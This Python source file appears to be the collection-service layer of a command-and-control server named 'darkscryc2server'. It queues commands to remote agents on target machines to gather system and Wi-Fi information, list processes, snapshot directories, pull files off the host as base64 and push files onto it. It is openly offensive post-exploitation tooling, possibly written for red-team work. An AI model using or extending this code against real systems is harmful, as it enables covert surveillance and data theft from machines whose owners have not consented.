import json
import uuid

from arq.jobs import Job
from darkscryc2server.models.messages import (
    AgentResponse,
    CommandIdentifiers,
)
from darkscryc2server.utils.remote_manager import remote_send_command

from ...utils.tasks import get_task_executor


class CollectionService:
    """Service layer for collection module interactions."""

    async def basic_machine_info_task(self, agent_id: uuid.UUID) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.GET_BASIC_MACHINE_INFO,
        )
        return uuid.UUID(job.job_id)

    async def stream_directory(self, agent_id: uuid.UUID, path: str) -> AgentResponse:
        resp = await remote_send_command(
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.SNAP_FULL_DIRECTORY,
            command={"path": path},
        )
        if resp.success and resp.data and "directory_snapshot" in resp.data:
            try:
                snapshot = json.loads(resp.data["directory_snapshot"])
                resp.data = snapshot
            except Exception as exc:
                resp.success = False
                resp.error = str(exc)
        return resp

    async def get_file_base64_task(self, agent_id: uuid.UUID, path: str) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.GET_FILE_BASE_64,
            command={"path": path},
        )
        return uuid.UUID(job.job_id)

    async def upload_file_base64_task(
        self, agent_id: uuid.UUID, path: str, file_base64: str, file_name: str
    ) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.UPLOAD_FILE_BASE_64,
            command={"path": path, "file_base64": file_base64, "file_name": file_name},
        )
        return uuid.UUID(job.job_id)

    async def wifi_basic_info_task(self, agent_id: uuid.UUID) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.GET_WIFI_BAISIC_INFO,
        )
        return uuid.UUID(job.job_id)

    async def enumerate_processes_task(self, agent_id: uuid.UUID) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.ENUMERATE_PROCESSES,
        )
        return uuid.UUID(job.job_id)
